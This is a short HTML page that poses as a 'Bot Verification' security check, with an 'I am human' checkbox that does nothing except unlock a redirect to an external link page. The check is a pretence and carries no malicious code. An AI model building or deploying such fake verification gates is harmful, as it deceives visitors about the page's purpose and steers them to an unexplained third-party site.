<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Security Check</title>
<style>
body{
background:#0f172a;
color:white;
font-family:Arial;
display:flex;
align-items:center;
justify-content:center;
height:100vh;
text-align:center;
}

.box{
background:#111827;
padding:30px;
border-radius:10px;
width:320px;
box-shadow:0 0 20px rgba(0,0,0,0.5);
}

button{
background:#22c55e;
border:none;
padding:15px;
width:100%;
color:white;
font-size:16px;
border-radius:6px;
cursor:pointer;
margin-top:20px;
}
</style>
</head>

<body>

<div class="box">
<h2>Bot Verification</h2>
<p>Please confirm you are not a robot.</p>

<label>
<input type="checkbox" id="check">
 I am human
</label>

<button onclick="go()">Continue</button>

</div>

<script>
function go(){
if(document.getElementById("check").checked){
window.location.href="https://ezbiolink.com/Privateplay";
}else{
alert("Please verify first");
}
}
</script>

</body>
</html>
